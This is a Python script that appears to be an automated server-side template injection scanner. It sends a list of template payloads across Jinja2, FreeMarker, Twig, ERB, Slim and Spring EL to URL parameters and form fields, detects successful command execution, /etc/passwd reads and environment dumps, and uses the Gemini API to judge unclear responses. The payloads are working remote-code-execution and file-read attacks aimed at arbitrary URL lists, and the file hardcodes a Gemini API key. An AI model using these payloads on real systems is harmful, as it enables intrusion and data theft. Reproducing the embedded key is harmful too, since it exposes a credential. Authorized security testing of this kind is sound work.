import os
import requests
import urllib.parse
import json
import time
import random
import string
import re
from concurrent.futures import ThreadPoolExecutor

# Gemini API configuration
GEMINI_API_KEY = "AIzaSyBRD2TjLNSV5LnTfD38DIy5CWjQy4SGJ_M"
GEMINI_API_URL = "https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent"

# SSTI payloads to test
SSTI_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "${7*7}",
    "${{7*7}}",
    "{{config}}",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{request}}",
    "{{self}}",
    "{{url_for.__globals__}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "${T(java.lang.System).getenv()}",
    "{{7*'7'}}",  # Jinja2 specific
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{{config.__class__.__init__.__globals__['os'].environ}}",
    "{{''.__class__.mro()[1].__subclasses__()[40]('/etc/passwd').read()}}",
    "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"id\").read()}}{%endif%}{% endfor %}",
    "${7*7}",  # Expression Language
    "#{7*7}",  # Expression Language
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",  # FreeMarker
    "[#assign ex='freemarker.template.utility.Execute'?new()]${{ex('id')}}",  # FreeMarker
    "{{['id']|filter('system')}}",  # Twig
    "{{['cat\x20/etc/passwd']|filter('system')}}",  # Twig
    "<%= system('id') %>",  # ERB
    "<%= `id` %>",  # ERB
    "<%= IO.popen('id').readlines() %>",  # ERB
    "<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('id') %><%= @b.readline()%>",  # ERB
    "{{= `id` }}",  # Slim
    "{{= system('id') }}",  # Slim
]

# Error patterns that might indicate SSTI vulnerability
SSTI_ERROR_PATTERNS = [
    "Template Error",
    "Twig_Error",
    "Twig\\Error",
    "Smarty error",
    "Liquid error",
    "Django template",
    "Jinja2",
    "FreeMarker template error",
    "Velocity",
    "org.apache.velocity",
    "Template syntax error",
    "Parse error",
    "Template parsing failed",
    "Template rendering error",
    "ERB::Error",
    "ActionView::Template::Error",
    "Thymeleaf exception",
    "org.thymeleaf",
    "Handlebars::ParseError",
    "Mustache",
    "Blade",
    "Laravel",
    "Template not found",
    "TemplateDoesNotExist",
    "TemplateNotFound",
    "TemplateSyntaxError",
    "Template compilation failed",
    "Liquid::SyntaxError",
    "Liquid::ArgumentError",
    "Liquid::StackLevelError",
]

# Headers for HTTP requests
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
}

def generate_random_string(length=8):
    """Generate a random string for testing."""
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def extract_urls_with_params(file_path):
    """Extract URLs with parameters from a file."""
    urls = []
    try:
        with open(file_path, 'r') as file:
            for line in file:
                url = line.strip()
                if url and '?' in url:  # Make sure URL is not empty and has parameters
                    urls.append(url)
    except Exception as e:
        print(f"Error reading file: {e}")
    
    print(f"Found {len(urls)} URLs with parameters to test.")
    return urls

def check_for_ssti_errors(response_text):
    """Check if the response contains SSTI error messages."""
    for pattern in SSTI_ERROR_PATTERNS:
        if pattern.lower() in response_text.lower():
            return True, pattern
    return False, None

def check_for_ssti_success(payload, response_text):
    """Check if the SSTI payload was successfully executed."""
    # For mathematical expressions like {{7*7}}
    if "{{7*7}}" in payload or "${7*7}" in payload or "#{7*7}" in payload:
        if "49" in response_text:
            return True, "Mathematical expression evaluated (7*7=49)"
    
    # For string multiplication like {{7*'7'}}
    if "{{7*'7'}}" in payload:
        if "7777777" in response_text:
            return True, "String multiplication detected (7*'7'='7777777')"
    
    # For command execution payloads, look for common command output
    if "popen('id')" in payload or "exec('id')" in payload:
        id_patterns = ["uid=", "gid=", "groups=", "User Name:", "SID:"]
        for pattern in id_patterns:
            if pattern in response_text:
                return True, f"Command execution detected ('{pattern}' found in response)"
    
    # For file reading payloads
    if "/etc/passwd" in payload:
        passwd_patterns = ["root:", "nobody:", "daemon:"]
        for pattern in passwd_patterns:
            if pattern in response_text:
                return True, f"File reading detected ('{pattern}' found in response)"
    
    # For environment variable access
    if "getenv" in payload or "environ" in payload:
        env_patterns = ["PATH=", "HOME=", "USER=", "TEMP=", "TMP="]
        for pattern in env_patterns:
            if pattern in response_text:
                return True, f"Environment variable access detected ('{pattern}' found in response)"
    
    return False, None

def analyze_with_gemini(url, payload, response_content, original_content):
    """
    Use Gemini API to analyze if the SSTI payload is likely to be successful.
    """
    # First, check for common SSTI error patterns
    has_error, error_pattern = check_for_ssti_errors(response_content)
    if has_error:
        return True, f"VULNERABLE: SSTI error detected: {error_pattern}"
    
    # Check for successful SSTI execution
    is_successful, success_reason = check_for_ssti_success(payload, response_content)
    if is_successful:
        return True, f"VULNERABLE: {success_reason}"
    
    # Check for significant differences in response
    if len(response_content) != len(original_content) and abs(len(response_content) - len(original_content)) > 100:
        return True, f"POTENTIALLY VULNERABLE: Significant difference in response length ({len(response_content)} vs {len(original_content)})"
    
    # Use Gemini for more advanced analysis
    prompt = f"""
    I need to analyze if this Server-Side Template Injection (SSTI) payload is likely to be successful based on the following response.
    
    URL: {url}
    Payload: {payload}
    
    Original Response Length: {len(original_content)}
    Modified Response Length: {len(response_content)}
    
    Modified Response (truncated if necessary):
    {response_content[:4000]}
    
    Please analyze if:
    1. There are any template engine error messages in the response
    2. The response shows signs of successful SSTI (e.g., template expressions being evaluated)
    3. The response structure has changed significantly compared to a normal response
    4. There are any indicators of command execution or file access
    
    Respond with only "VULNERABLE" or "NOT VULNERABLE" followed by a brief explanation.
    """
    
    api_url = f"{GEMINI_API_URL}?key={GEMINI_API_KEY}"
    
    data = {
        "contents": [
            {
                "parts": [
                    {"text": prompt}
                ]
            }
        ],
        "generationConfig": {
            "temperature": 0.1,
            "maxOutputTokens": 200
        }
    }
    
    try:
        response = requests.post(api_url, json=data)
        if response.status_code == 200:
            result = response.json()
            if "candidates" in result and len(result["candidates"]) > 0:
                text = result["candidates"][0]["content"]["parts"][0]["text"]
                is_vulnerable = text.strip().startswith("VULNERABLE")
                explanation = text.strip()
                return is_vulnerable, explanation
        return False, "Error analyzing response with Gemini"
    except Exception as e:
        return False, f"Error calling Gemini API: {str(e)}"

def test_url_for_ssti(url):
    """Test a URL for SSTI vulnerabilities."""
    print(f"Testing URL: {url}")
    results = []
    
    try:
        # Parse the URL to get parameters
        parsed_url = urllib.parse.urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        # If no parameters in URL, try to find form fields
        if not query_params:
            try:
                print(f"No query parameters found, checking for forms in {url}")
                response = requests.get(url, headers=HEADERS, timeout=10)
                
                # Simple form field extraction
                form_fields = []
                if '<form' in response.text.lower():
                    # Extract input fields from forms
                    input_pattern = r'<input.*?name=["\']([^"\']+)["\']'
                    form_fields = re.findall(input_pattern, response.text, re.IGNORECASE)
                    
                    if form_fields:
                        print(f"Found {len(form_fields)} form fields: {', '.join(form_fields)}")
                        
                        # Test each form field with SSTI payloads
                        for field in form_fields:
                            # First get a baseline response
                            normal_value = generate_random_string()
                            test_data = {field: normal_value}
                            
                            try:
                                normal_response = requests.post(url, data=test_data, headers=HEADERS, timeout=10)
                                normal_content = normal_response.text
                                
                                # Test SSTI payloads
                                for payload in SSTI_PAYLOADS:
                                    sqli_data = {field: payload}
                                    ssti_response = requests.post(url, data=sqli_data, headers=HEADERS, timeout=10)
                                    
                                    # Check for SSTI errors or successful execution
                                    has_error, error_pattern = check_for_ssti_errors(ssti_response.text)
                                    is_successful, success_reason = check_for_ssti_success(payload, ssti_response.text)
                                    
                                    if has_error:
                                        print(f"Potential SSTI found in form field {field} with payload {payload}")
                                        results.append({
                                            'url': url,
                                            'param': f"form:{field}",
                                            'payload': payload,
                                            'status': 'Potential SSTI Vulnerability (Form)',
                                            'analysis': f"SSTI error detected: {error_pattern}"
                                        })
                                        break
                                    
                                    if is_successful:
                                        print(f"Potential SSTI found in form field {field} with payload {payload}")
                                        results.append({
                                            'url': url,
                                            'param': f"form:{field}",
                                            'payload': payload,
                                            'status': 'Potential SSTI Vulnerability (Form)',
                                            'analysis': success_reason
                                        })
                                        break
                                    
                                    # If no obvious error or success, use Gemini for analysis
                                    is_vulnerable, explanation = analyze_with_gemini(url, payload, ssti_response.text, normal_content)
                                    
                                    if is_vulnerable:
                                        results.append({
                                            'url': url,
                                            'param': f"form:{field}",
                                            'payload': payload,
                                            'status': 'Potential SSTI Vulnerability (Form)',
                                            'analysis': explanation
                                        })
                                        break
                            except Exception as e:
                                print(f"Error testing form field {field}: {e}")
                                continue
            except Exception as e:
                print(f"Error checking for forms: {e}")
            
            return results
        
        # Test each parameter individually
        for param, values in query_params.items():
            print(f"Testing parameter: {param}")
            
            # Get a baseline response with a normal value
            normal_value = generate_random_string()
            test_params = {p: values[0] for p, values in query_params.items()}
            test_params[param] = normal_value
            test_url = f"{base_url}?{urllib.parse.urlencode(test_params, doseq=True)}"
            
            try:
                normal_response = requests.get(test_url, headers=HEADERS, timeout=10)
                normal_content = normal_response.text
                
                # Test SSTI payloads
                for payload in SSTI_PAYLOADS:
                    ssti_params = {p: values[0] for p, values in query_params.items()}
                    ssti_params[param] = payload
                    ssti_url = f"{base_url}?{urllib.parse.urlencode(ssti_params, doseq=True)}"
                    
                    try:
                        ssti_response = requests.get(ssti_url, headers=HEADERS, timeout=10)
                        
                        # Check for SSTI errors
                        has_error, error_pattern = check_for_ssti_errors(ssti_response.text)
                        
                        if has_error:
                            print(f"Potential SSTI found in parameter {param} with payload {payload}")
                            results.append({
                                'url': url,
                                'param': param,
                                'payload': payload,
                                'status': 'Potential SSTI Vulnerability',
                                'analysis': f"SSTI error detected: {error_pattern}"
                            })
                            break
                        
                        # Check for successful SSTI execution
                        is_successful, success_reason = check_for_ssti_success(payload, ssti_response.text)
                        
                        if is_successful:
                            print(f"Potential SSTI found in parameter {param} with payload {payload}")
                            results.append({
                                'url': url,
                                'param': param,
                                'payload': payload,
                                'status': 'Potential SSTI Vulnerability',
                                'analysis': success_reason
                            })
                            break
                        
                        # Use Gemini for more advanced analysis
                        is_vulnerable, explanation = analyze_with_gemini(ssti_url, payload, ssti_response.text, normal_content)
                        
                        if is_vulnerable:
                            print(f"Potential SSTI found in parameter {param} with payload {payload}")
                            results.append({
                                'url': url,
                                'param': param,
                                'payload': payload,
                                'status': 'Potential SSTI Vulnerability',
                                'analysis': explanation
                            })
                            break
                    except Exception as e:
                        print(f"Error testing SSTI payload: {e}")
                        continue
            except Exception as e:
                print(f"Error testing parameter {param}: {e}")
        
    except Exception as e:
        print(f"Error processing URL {url}: {e}")
    
    return results

def scan_ssti(params_file_path, max_workers=3):
    """
    Scan URLs with parameters for SSTI vulnerabilities.
    
    Args:
        params_file_path: Path to the file containing URLs with parameters
        max_workers: Maximum number of concurrent workers
    
    Returns:
        List of potential SSTI vulnerabilities
    """
    if not os.path.exists(params_file_path):
        print(f"File not found: {params_file_path}")
        return []
    
    urls = extract_urls_with_params(params_file_path)
    if not urls:
        print("No URLs with parameters found in the file.")
        return []
    
    print(f"Found {len(urls)} URLs with parameters to test.")
    
    # Process URLs in smaller batches to show progress
    batch_size = 5
    all_results = []
    
    for i in range(0, len(urls), batch_size):
        batch = urls[i:i+batch_size]
        print(f"\nProcessing batch {i//batch_size + 1}/{(len(urls) + batch_size - 1)//batch_size}...")
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            results = list(executor.map(test_url_for_ssti, batch))
            
            for result in results:
                all_results.extend(result)
                
        # Show intermediate results
        if all_results:
            print(f"Found {len(all_results)} potential vulnerabilities so far")
    
    # Save results to file
    output_dir = os.path.dirname(params_file_path)
    domain = os.path.basename(params_file_path).split('_')[0]
    output_file = os.path.join(output_dir, f"{domain}_ssti_results.txt")
    
    with open(output_file, 'w') as f:
        if all_results:
            f.write("SSTI Vulnerability Scan Results\n")
            f.write("=======================================\n\n")
            
            for result in all_results:
                f.write(f"URL: {result['url']}\n")
                f.write(f"Parameter: {result['param']}\n")
                f.write(f"Payload: {result['payload']}\n")
                f.write(f"Status: {result['status']}\n")
                f.write(f"Analysis: {result['analysis']}\n")
                f.write("-----------------------------\n\n")
        else:
            f.write("No SSTI vulnerabilities found.\n")
    
    return all_results

def test_specific_parameter(param_name, target_url=None):
    """Test a specific parameter for SSTI vulnerabilities."""
    if not target_url:
        target_url = "http://testphp.vulnweb.com/listproducts.php"
    
    url = f"{target_url}?{param_name}=1"
    print(f"Testing parameter '{param_name}' on URL: {url}")
    
    results = []
    
    try:
        # Get a baseline response
        normal_response = requests.get(url, headers=HEADERS, timeout=10)
        normal_content = normal_response.text
        
        # Test SSTI payloads
        for payload in SSTI_PAYLOADS:
            ssti_url = f"{target_url}?{param_name}={urllib.parse.quote(payload)}"
            
            try:
                ssti_response = requests.get(ssti_url, headers=HEADERS, timeout=10)
                
                # Check for SSTI errors
                has_error, error_pattern = check_for_ssti_errors(ssti_response.text)
                
                if has_error:
                    print(f"Potential SSTI found with payload {payload}")
                    results.append({
                        'url': target_url,
                        'param': param_name,
                        'payload': payload,
                        'status': 'Potential SSTI Vulnerability',
                        'analysis': f"SSTI error detected: {error_pattern}"
                    })
                    break
                
                # Check for successful SSTI execution
                is_successful, success_reason = check_for_ssti_success(payload, ssti_response.text)
                
                if is_successful:
                    print(f"Potential SSTI found with payload {payload}")
                    results.append({
                        'url': target_url,
                        'param': param_name,
                        'payload': payload,
                        'status': 'Potential SSTI Vulnerability',
                        'analysis': success_reason
                    })
                    break
                
                # If no obvious error or success, use Gemini for analysis
                is_vulnerable, explanation = analyze_with_gemini(ssti_url, payload, ssti_response.text, normal_content)
                
                if is_vulnerable:
                    print(f"Potential SSTI found with payload {payload}")
                    results.append({
                        'url': target_url,
                        'param': param_name,
                        'payload': payload,
                        'status': 'Potential SSTI Vulnerability',
                        'analysis': explanation
                    })
                    break
            except Exception as e:
                print(f"Error testing SSTI payload: {e}")
    
    except Exception as e:
        print(f"Error testing parameter: {e}")
    
    return results

if __name__ == "__main__":
    # For testing the script directly
    import sys
    
    if len(sys.argv) > 1:
        file_path = sys.argv[1]
        
        # Check if it's a direct parameter test
        if '=' in file_path and not os.path.exists(file_path):
            param_name = file_path.split('=')[0]
            target_url = None
            if len(sys.argv) > 2:
                target_url = sys.argv[2]
            
            results = test_specific_parameter(param_name, target_url)
            
            if results:
                print(f"\nFound {len(results)} potential SSTI vulnerabilities!")
                for result in results:
                    print(f"\nURL: {result['url']}")
                    print(f"Parameter: {result['param']}")
                    print(f"Payload: {result['payload']}")
                    print(f"Status: {result['status']}")
                    print(f"Analysis: {result['analysis']}")
            else:
                print("\nNo SSTI vulnerabilities found.")
        else:
            print(f"Scanning file: {file_path}")
            results = scan_ssti(file_path)
            
            if results:
                print(f"\nFound {len(results)} potential SSTI vulnerabilities!")
                for result in results:
                    print(f"\nURL: {result['url']}")
                    print(f"Parameter: {result['param']}")
                    print(f"Payload: {result['payload']}")
                    print(f"Status: {result['status']}")
                    print(f"Analysis: {result['analysis']}")
            else:
                print("\nNo SSTI vulnerabilities found.")
    else:
        print("Usage: python ssti_test.py <path_to_params_file_or_parameter>")
        print("Examples:")
        print("  python ssti_test.py C:\\Users\\begad\\OneDrive\\Desktop\\Recon-test\\crawler\\example.com_params.txt")
        print("  python ssti_test.py template=test http://vulnerable-website.com/page")